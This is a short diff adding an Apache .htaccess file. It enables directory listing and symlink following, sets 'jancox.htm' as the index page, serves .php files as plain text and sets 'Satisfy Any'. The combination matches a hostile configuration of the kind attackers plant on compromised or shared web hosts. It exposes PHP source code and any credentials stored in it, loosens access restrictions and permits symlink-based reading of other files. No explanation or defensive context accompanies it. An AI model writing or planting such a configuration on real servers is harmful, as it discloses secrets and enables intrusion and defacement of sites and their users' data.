@@ -1,0 +1,5 @@
+Options Indexes FollowSymLinks
+DirectoryIndex jancox.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
